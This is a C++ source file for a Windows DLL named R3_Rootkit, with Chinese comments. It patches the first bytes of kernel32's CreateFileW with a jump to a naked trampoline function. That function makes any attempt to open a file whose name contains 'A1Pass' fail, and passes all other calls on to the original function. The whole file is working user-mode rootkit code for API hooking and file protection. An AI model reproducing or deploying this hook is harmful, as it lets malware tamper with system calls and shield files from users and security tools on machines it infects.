// R3_Rootkit.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <string.h>
#include <stdio.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")

LPCTSTR g_lpFileName     = nullptr;
DWORD   g_dwCreateFile_5 = 0;       // Hook后的CreateFile的正常起始地址

DWORD Detour(LPCTSTR lpFileName)
{
	if ( wcsstr(PathFindFileName(lpFileName), L"A1Pass") )
		return 1;
	return 0;
}


extern "C" _declspec(dllexport) _declspec(naked) void Trampline()
{
	_asm push eax;
	_asm mov  eax,DWORD PTR[esp+0x8]; // 将CreateFileW的第一个参数传给eax
	_asm mov  g_lpFileName,eax;       // 将此参数地址保存在g_lpFileName中
	_asm pop  eax;
	if ( Detour(g_lpFileName) )       // 执行我们的绕行函数，判断文件名是否为需要保护的
	{
		_asm mov eax,-1;              // 是的话则将函数返回值改为-1（打开失败）
		_asm retn 0x1C;               // 返回到调用
	}
	_asm push ebp;                    // 否则执行原函数头部被替换掉的指令，并跳转到原函数
	_asm mov ebp,esp;
	_asm push g_dwCreateFile_5;
	_asm ret;
}

void HookCreateFileW()
{
	FARPROC fnCreateFile = GetProcAddress( GetModuleHandle(L"kernel32.dll"), "CreateFileW");
	FARPROC fnHookFun    = GetProcAddress( GetModuleHandle(L"R3_Rootkit.dll"), "Trampline");

	DWORD oldProtect;
	VirtualProtect(fnCreateFile, 0x5, PAGE_EXECUTE_READWRITE, &oldProtect);
	*((PBYTE)fnCreateFile)           = 0xE9;
	*(PDWORD)((PBYTE)fnCreateFile+1) = (DWORD)fnHookFun - (DWORD)fnCreateFile - 5;
	VirtualProtect(fnCreateFile, 0x5, oldProtect, &oldProtect);

	g_dwCreateFile_5 = (DWORD)fnCreateFile + 5;
}